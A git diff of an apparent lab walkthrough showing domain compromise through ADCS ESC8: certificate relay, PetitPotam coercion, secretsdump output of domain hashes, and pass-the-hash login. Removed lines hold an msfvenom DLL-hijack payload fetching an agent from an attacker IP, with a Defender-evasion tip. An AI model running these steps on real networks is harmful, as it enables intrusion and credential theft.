@@ -550,24 +550,315 @@ IT Security Administrator
 DISMAY Ltd.
 ```
 
-So after attempting analysis on the files here and finding nothing and also attempting to capture NTLM auth using write access i think this may be a rabbit hole!
+There could be a potential for DLL hijacking here!
 
-# Exe analysis
-So after transferring `dism.exe` to a windows machine and running it i get an error as it was trying to call a dll called `dismcore.dll`
+# ADCS
 
-So it may be possible to attempt DLL hijacking
-
-Because of DLL search order i can craft a malicious dll then place it in the same dir as the exe and it will pull from that malicious DLL
-
-# Malicious DLL creation
 ```python
-msfvenom -a x64 -p windows/download_exec EXE=agent.x64.exe URL=http://10.200.50.211:8000/agent.x64.exe -f dll -o dismcore.dll
+certipy-ad find -u mike.silver@dismay.hsm -p 'Password123!' -dc-host dc2.dismay.hsm -dc-ip 10.0.18.13 -stdout -vulnerable
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 13 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'dismay-DC2-CA' via RRP
+[*] Successfully retrieved CA configuration for 'dismay-DC2-CA'
+[*] Checking web enrollment for CA 'dismay-DC2-CA' @ 'DC2.dismay.hsm'
+[!] Error checking web enrollment: [Errno 104] Connection reset by peer
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : dismay-DC2-CA
+    DNS Name                            : DC2.dismay.hsm
+    Certificate Subject                 : CN=dismay-DC2-CA, DC=dismay, DC=hsm
+    Certificate Serial Number           : 5EA6EE1EAB2DF09345DA0E3710165C06
+    Certificate Validity Start          : 2025-12-12 13:32:01+00:00
+    Certificate Validity End            : 2030-12-12 13:41:10+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : True
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : DISMAY.HSM\Administrators
+      Access Rights
+        ManageCa                        : DISMAY.HSM\Administrators
+                                          DISMAY.HSM\Domain Admins
+                                          DISMAY.HSM\Enterprise Admins
+        ManageCertificates              : DISMAY.HSM\Administrators
+                                          DISMAY.HSM\Domain Admins
+                                          DISMAY.HSM\Enterprise Admins
+        Enroll                          : DISMAY.HSM\Authenticated Users
+    [!] Vulnerabilities
+      ESC8                              : Web Enrollment is enabled over HTTP.
+Certificate Templates                   : [!] Could not find any certificate templates
+```
+Looks to be vulnerable to ESC8
+
+## Domain Admin via ESC8
+
+PLEASE NOTE: At this point the network was reset as recommended to me by a platform admin so therefore IP addresses will be different!
+
+https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/
+
+So there is a vulnerable HTTP endpoint on DC2 which i can use to relay authentication to!
+
+Now i know its vulnerable and where i will relay authentication i can find a valid template to use!
+
+```python
+certipy-ad find -u mike.silver@dismay.hsm -p 'Password123!' -dc-host dc1.dismay.hsm -stdout
+
+  32
+    Template Name                       : User
+    Display Name                        : User
+    Certificate Authorities             : dismay-DC2-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectAltRequireEmail
+                                          SubjectRequireEmail
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+                                          AutoEnrollment
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2025-12-12T13:42:01+00:00
+    Template Last Modified              : 2025-12-12T13:51:16+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : DISMAY.HSM\DC1
+                                          DISMAY.HSM\Domain Admins
+                                          DISMAY.HSM\Enterprise Admins
+      Object Control Permissions
+        Owner                           : DISMAY.HSM\Enterprise Admins
+        Full Control Principals         : DISMAY.HSM\Domain Admins
+                                          DISMAY.HSM\Enterprise Admins
+        Write Owner Principals          : DISMAY.HSM\Domain Admins
+                                          DISMAY.HSM\Enterprise Admins
+        Write Dacl Principals           : DISMAY.HSM\Domain Admins
+                                          DISMAY.HSM\Enterprise Admins
+        Write Property Enroll           : DISMAY.HSM\Domain Admins
+                                          DISMAY.HSM\Enterprise Admins
+
+```
+Ive found an enabled template that has dc1 listed with enrollment rights
+
+This will work because i will be coercing DC1 to authenticate to me then ntlmrelayx can relay the auth to the vulnerable http endpoint on DC2
+
+Which in turn should give me a pfx for DC1
+
+```python
+impacket-ntlmrelayx --adcs -smb2support --template User -t http://dc2.dismay.hsm/certsrv/certfnsh.asp
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client RPC loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up RPC Server on port 135
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+```
+First ill start ntlmrelayx using valid template and the vulnerable endpoint
+
+```python
+nxc smb dc1.dismay.hsm -d dismay.hsm -u mike.silver -p 'Password123!' -M coerce_plus -o METHOD=PetitPotam LISTENER=10.200.50.211
+SMB         10.1.139.227    445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:dismay.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.139.227    445    DC1              [+] dismay.hsm\mike.silver:Password123! 
+COERCE_PLUS 10.1.139.227    445    DC1              VULNERABLE, PetitPotam
+COERCE_PLUS 10.1.139.227    445    DC1              Exploit Success, efsrpc\EfsRpcAddUsersToFile
+```
+Ill use `mike.silver` credentials on dc1 since this is what i want to coerce to dc2
+
+Ill also specify my listener so that ntlmrelayx can relay the auth to dc2
+
+```python
+[*] (SMB): Received connection from 10.1.139.227, attacking target http://dc2.dismay.hsm
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (SMB): Authenticating connection from DISMAY/DC1$@10.1.139.227 against http://dc2.dismay.hsm SUCCEED [1]
+[*] (SMB): Received connection from 10.1.139.227, attacking target http://dc2.dismay.hsm
+[*] http://DISMAY/DC1$@dc2.dismay.hsm [1] -> Generating CSR...
+[*] http://DISMAY/DC1$@dc2.dismay.hsm [1] -> CSR generated!
+[*] http://DISMAY/DC1$@dc2.dismay.hsm [1] -> Getting certificate...
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (SMB): Authenticating connection from DISMAY/DC1$@10.1.139.227 against http://dc2.dismay.hsm SUCCEED [2]
+[*] http://DISMAY/DC1$@dc2.dismay.hsm [2] -> Skipping user DC1$ since attack was already performed
+[*] http://DISMAY/DC1$@dc2.dismay.hsm [1] -> GOT CERTIFICATE! ID 11
+[*] http://DISMAY/DC1$@dc2.dismay.hsm [1] -> Writing PKCS#12 certificate to ./DC1.pfx
+[*] http://DISMAY/DC1$@dc2.dismay.hsm [1] -> Certificate successfully written to file
+```
+After a moment of running nxc i get a certificate for dc1 back from ntlmrelayx
+
+From here i can use the certificate to get the NTLM of DC1$
+
+```python
+certipy-ad auth -pfx DC1.pfx -dc-ip 10.1.139.227                                                          
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'DC1$@dismay.hsm'
+[*]     Security Extension SID: 'S-1-5-21-1359501962-4064634841-3558559731-1000'
+[*] Using principal: 'dc1$@dismay.hsm'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'dc1.ccache'
+[*] Wrote credential cache to 'dc1.ccache'
+[*] Trying to retrieve NT hash for 'dc1$'
+[*] Got hash for 'dc1$@dismay.hsm': aad3b435b51404eeaad3b435b51404ee:07051010977116b587c2b52b40f14ac0
+```
+Now i have DC1 NTLM hash i can dump all the secrets
+
+```python
+impacket-secretsdump DC1\$@dismay.hsm -hashes ':07051010977116b587c2b52b40f14ac0'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b20bd68c786d847c122ed2b1e8ab60b0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:746e5739a93cf20f26f6952227a3c321:::
+dismay.hsm\mike.silver:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+dismay.hsm\wang.kali:1109:aad3b435b51404eeaad3b435b51404ee:3c96bcb2622d45fc301fd72ba3004dd9:::
+dismay.hsm\nadia.robin:1110:aad3b435b51404eeaad3b435b51404ee:bd0ff5e06c9ccec992bb8f96d986effb:::
+dismay.hsm\jena.yamazaki:1111:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+dismay.hsm\guy.rookie:1112:aad3b435b51404eeaad3b435b51404ee:bfbb44b71a8f029be27d12097fe84d0b:::
+DC1$:1000:aad3b435b51404eeaad3b435b51404ee:07051010977116b587c2b52b40f14ac0:::
+DC2$:1114:aad3b435b51404eeaad3b435b51404ee:e4be361c7a7912da2944fe7caa6d1f5f:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:1967ef2ca07699ad25d1cd876037987e0e5afafd1d382d94d619ea42701007e4
+Administrator:aes128-cts-hmac-sha1-96:1902fb174bd31774a9fa2cf7ad9246e4
+Administrator:des-cbc-md5:f2f84f0b13a11f20
+krbtgt:aes256-cts-hmac-sha1-96:724d78f497efe782bb98bcbc274545692df9967281d81422835140e0b0e64406
+krbtgt:aes128-cts-hmac-sha1-96:5fdf66f8be1aa88afbc45f59455c285a
+krbtgt:des-cbc-md5:49c7da376e512c13
+dismay.hsm\mike.silver:aes256-cts-hmac-sha1-96:948819130ca78344d5cdabf55be7c0d6841e17ffed5173058f154267e2fd8e19
+dismay.hsm\mike.silver:aes128-cts-hmac-sha1-96:bfb1198dc5bff52f8cfab8ad42452f74
+dismay.hsm\mike.silver:des-cbc-md5:9485293eb9e07ad0
+dismay.hsm\wang.kali:aes256-cts-hmac-sha1-96:b900a1896c92240025b1ed558dc5eeb2fd42a6ef58e11d55a50a054c197dca42
+dismay.hsm\wang.kali:aes128-cts-hmac-sha1-96:f0dae3685b840c9bdaffa62a908c832a
+dismay.hsm\wang.kali:des-cbc-md5:ba0443c25e9decf8
+dismay.hsm\nadia.robin:aes256-cts-hmac-sha1-96:b8c2a01ac6a5277a997f4df80171775b6464799a8e64e04eef33fd66fd0a8064
+dismay.hsm\nadia.robin:aes128-cts-hmac-sha1-96:9d3edb3f1b741874c009adc57a6020ae
+dismay.hsm\nadia.robin:des-cbc-md5:833e83806b8c891a
+dismay.hsm\jena.yamazaki:aes256-cts-hmac-sha1-96:12bab5065ceedbc5825784eb1538f3407b1305599e269b0a09280c7c4dcb5f9d
+dismay.hsm\jena.yamazaki:aes128-cts-hmac-sha1-96:7f7ee6fcc747b91039de8d313e22ad8b
+dismay.hsm\jena.yamazaki:des-cbc-md5:7fbaf42c7a923bba
+dismay.hsm\guy.rookie:aes256-cts-hmac-sha1-96:90f2a550624cc8ea7a57b94e1de18b31cb8b9279175515415a6095a646dd4e4b
+dismay.hsm\guy.rookie:aes128-cts-hmac-sha1-96:33b5731de9e30cf521cb7e1308ef79f4
+dismay.hsm\guy.rookie:des-cbc-md5:452637490e0db53e
+DC1$:aes256-cts-hmac-sha1-96:29f0eeb1af00fb34e8fbcd30b2c0aefc41e7c37afb5dbb261de6cc7e526b0b73
+DC1$:aes128-cts-hmac-sha1-96:1b6c3770070d8e27b63dc518b1197962
+DC1$:des-cbc-md5:ecea941c51bc6143
+DC2$:aes256-cts-hmac-sha1-96:c7f89fa373667d788fdc5d5c4b4bc6d31ada340d4f495eaa03ede08496a57129
+DC2$:aes128-cts-hmac-sha1-96:a4ef6191677e28955624bbb51a656c27
+DC2$:des-cbc-md5:ea085794853da149
+[*] Cleaning up...
+```
+I can then use the hash for DC1$ and dump the contents of NTDS.dit
+
+```python
+evil-winrm -i dc1.dismay.hsm -u Administrator -H 'b20bd68c786d847c122ed2b1e8ab60b0'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
 
-So the idea here is to set a listener on my c2 then generate an agent, i can then host the agent using a python web server but by crafting the malicious DLL using a command like i did above i should be able to plant the DLL in the smb share and due to DLL search orders it should check the current directory of the exe which will call my malicious DLL which will reach out to the webserver get my agent then execute it resulting in a c2 session
+```python
+*Evil-WinRM* PS C:\Users\Administrator> whoami /priv
 
-https://github.com/duck-sec/msfvenom-revshell-cheatsheet
+PRIVILEGES INFORMATION
+----------------------
 
-It is likely that the payload can be xor encrypted to bypass defender, something that simple is often all that is required to bypass it!
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator> 
+```
+Domain admin!
 
+# Alternative paths:
+
+So initially there was two options after getting RDP access to the nexus server, you could either:
+- Retrieve credentials from the 7z archive in the recycle bin which would give you access to guy.rookie (Shown in this walkthrough)
+- Perform a WSUS exploit, that was also referenced in this walkthrough
+
+Later on there was also a choice, after gaining access to guy.rookie, you could either:
+- Peform bloodhound enumeration eventually leading to adding a user to a share operator group which gives write access to the `tools` share you can then perform DLL hijacking
+- You can run certipy as guy.rookie and find out it is vulnerable to ESC8 (Shown in this walkthrough)
+
+<<<<<<< HEAD
 UNFINISHED!
+=======
+
+>>>>>>> origin/main
